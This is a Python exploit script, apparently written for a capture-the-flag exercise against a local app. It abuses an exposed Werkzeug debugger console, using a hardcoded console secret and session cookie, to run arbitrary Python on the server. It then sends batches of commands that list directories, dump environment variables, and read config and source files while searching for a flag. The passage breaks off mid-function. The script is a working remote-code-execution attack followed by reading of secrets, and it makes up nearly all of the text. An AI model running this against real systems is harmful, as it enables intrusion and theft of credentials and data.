import requests
import re
import json
import urllib.parse

# Configuration
BASE_URL = "http://127.0.0.1:5003"
CONSOLE_URL = f"{BASE_URL}/console"
SESSION_COOKIE = ".eJwlTstqwzAQ_BWx51Cst-Sv6L2EsJZmY4PbFMs5hfx7F3oa5sm86CY7jxWD5q8XmVOBvjEG30EX-tzBA2Z_3M32Y86H4dbUNOe6DfOrmQ-6vq8XHTkwVprP4wllW6eZandSI3oCCy8MnqKPUoMU26dgpQPcXJhqVsMFgeXInUOISBXF55jES2jagbSaknNoPi8uoTW_5OoXUb0Um3KIMulyh5cktfuYuej923Pg-H9j6f0Hj05H0g.aVsUEw.pzEXTKPJRkglOFBxL9YRXm0BK1c"

# Extracted from the console page
SECRET = "YKhX0CLt5PHAxuDtcFOy"

headers = {
    "User-Agent": "Mozilla/5.0 (Security Research)",
    "Cookie": f"session={SESSION_COOKIE}"
}

def execute_python_code(code):
    """Execute Python code in the Werkzeug debugger console"""
    # The debugger uses a special endpoint with the secret
    # Format: ?__debugger__=yes&cmd=execute&frm=0&s=<secret>&code=<urlencoded_code>
    
    encoded_code = urllib.parse.quote(code)
    execute_url = f"{CONSOLE_URL}?__debugger__=yes&cmd=execute&frm=0&s={SECRET}&code={encoded_code}"
    
    try:
        response = requests.get(execute_url, headers=headers, timeout=15)
        return {
            "status": response.status_code,
            "text": response.text,
            "success": response.status_code == 200
        }
    except Exception as e:
        return {
            "status": "ERROR",
            "error": str(e),
            "success": False
        }

def search_for_flags_with_code_execution():
    """Use the console to search for flags in the filesystem and application"""
    print("=" * 80)
    print("EXPLOITING WERKZEUG DEBUGGER CONSOLE")
    print("=" * 80)
    print(f"Console URL: {CONSOLE_URL}")
    print(f"Secret: {SECRET}")
    print()
    
    # Test simple code execution
    print("[*] Testing code execution...")
    test_code = "print('Hello from console!')"
    result = execute_python_code(test_code)
    
    if result["success"]:
        print("[+] Code execution confirmed working!")
        print(f"Response: {result['text'][:200]}")
    else:
        print(f"[-] Code execution failed: {result.get('error', 'Unknown error')}")
        return
    
    # Search for flag in common locations
    print("\n[*] Searching for flags in application...")
    
    search_commands = [
        # Search in current directory
        "import os; print('Current dir:', os.getcwd()); print('Files:', os.listdir('.'))",
        
        # Search for files containing "flag"
        "import os; [print(f) for f in os.listdir('.') if 'flag' in f.lower()]",
        
        # Search in parent directories
        "import os; [print(f) for f in os.listdir('..') if 'flag' in f.lower()]",
        
        # Check environment variables
        "import os; print([v for k, v in os.environ.items() if 'flag' in k.lower() or 'flag' in str(v).lower()])",
        
        # Search for FLAG{ pattern in all Python files
        "import os; [print(open(f).read()) for f in os.listdir('.') if f.endswith('.py') and 'flag' in open(f).read().lower()]",
        
        # Try to read common flag locations
        "import os; [print(open(f).read()[:200]) for f in ['flag.txt', 'FLAG.txt', 'flag', 'FLAG', '../flag.txt', '../../flag.txt'] if os.path.exists(f)]",
        
        # Search in config files
        "import os; [print(open(f).read()[:200]) for f in ['config.py', 'settings.py', 'app.py'] if os.path.exists(f)]",
        
        # List all Python files and search for FLAG
        "import os; files = [f for f in os.listdir('.') if f.endswith('.py')]; [print(f, open(f).read()[:100]) for f in files]",
        
        # Try to find the application source
        "import sys; print('Python path:', sys.path[:3])",
    ]
    
    flags_found = []
    
    for i, cmd in enumerate(search_commands):
        print(f"\n[*] Executing search command {i+1}...")
        result = execute_python_code(cmd)
        
        if result["success"] and result["text"]:
            print(f"Result: {result['text'][:500]}")
            
            # Check if flag pattern is in the output
            flag_match = re.search(r'FLAG\{[^}]+\}', result["text"], re.IGNORECASE)
            if flag_match:
                flags_found.append((cmd, flag_match.group()))
                print(f"[!] FLAG FOUND: {flag_match.group()}")
        else:
            print(f"[-] Command failed or no output")
    
    return flags_found

def enumerate_files_and_directories():
    """Use the console to enumerate the filesystem"""
    print("\n" + "=" * 80)
    print("ENUMERATING FILESYSTEM")
    print("=" * 80)
    
    enumeration_commands = [
        # Current directory
        "import os; print('=== CURRENT DIRECTORY ==='); print('CWD:', os.getcwd()); print('\\nFiles:'); [print(' -', f, '(dir)' if os.path.isdir(f) else '(file)') for f in sorted(os.listdir('.'))]",
        
        # Parent directory
        "import os; print('=== PARENT DIRECTORY ==='); [print(' -', f, '(dir)' if os.path.isdir(os.path.join('..', f)) else '(file)') for f in sorted(os.listdir('..'))]",
        
        # Check for common directories
        "import os; dirs = ['app', 'src', 'templates', 'static', 'config', 'etc', 'root', 'home']; [print(d, 'exists:', os.path.exists(d)) for d in dirs]",
        
        # Try to go up multiple levels
        "import os; [print(f'Level {i}:', os.path.abspath(os.path.join('.', '..' * i))) for i in range(4)]",
        
        # List root (if accessible)
        "import os; os.path.exists('/') and print('Root access possible')",
        
        # Find all Python files recursively (limited)
        "import os; print('Python files:'); [print(' -', f) for f in os.listdir('.') if f.endswith('.py')]",
    ]
    
    findings = []
    
    for cmd in enumeration_commands:
        print(f"\n[*] Executing: {cmd[:60]}...")
        result = execute_python_code(cmd)
        
